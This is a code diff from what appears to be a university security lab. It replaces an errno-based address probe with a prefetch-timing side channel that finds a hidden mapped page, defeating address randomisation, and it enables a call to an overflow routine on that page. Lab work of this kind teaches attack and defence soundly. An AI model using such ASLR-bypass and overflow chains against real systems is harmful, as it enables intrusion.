@@ -31,17 +31,24 @@ void do_overflow(uint64_t page_addr);
 uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
 	// Put your Part 1 code here
 	// You are free to choose any of 1A, 1B, or 1C
-	for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
-        // TODO: Figure out if "addr" is the correct address or not.
-        const char *pathname = (const char *)addr;
-
-        // Attempt to access the "file"
-        access(pathname, F_OK);
-        if (errno == 2) {
-            return addr;
+	uint64_t valid_addr = 0;
+    long min = 1 << 30;
+    uint32_t cpu_s, cpu_e;
+    long start , end , dt;
+    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
+        mem_fence();
+        start = rdtscp1(&cpu_s);
+        prefetch(addr);
+        end = rdtscp1(&cpu_e);
+        mem_fence();
+        dt = end - start;
+        if (dt < min) {
+            min = dt;
+            valid_addr = addr;
         }
+        // TODO: Figure out if "addr" is the correct address or not.
     }
-    return 0;
+    return valid_addr;
 }
 
 /*
@@ -95,5 +102,5 @@ void do_overflow(uint64_t page_addr) {
  */
 void lab_code(uint64_t low_bound, uint64_t high_bound) {
 	uint64_t found_page = find_address(low_bound, high_bound);
-	//do_overflow(found_page);
+	do_overflow(found_page);
 }
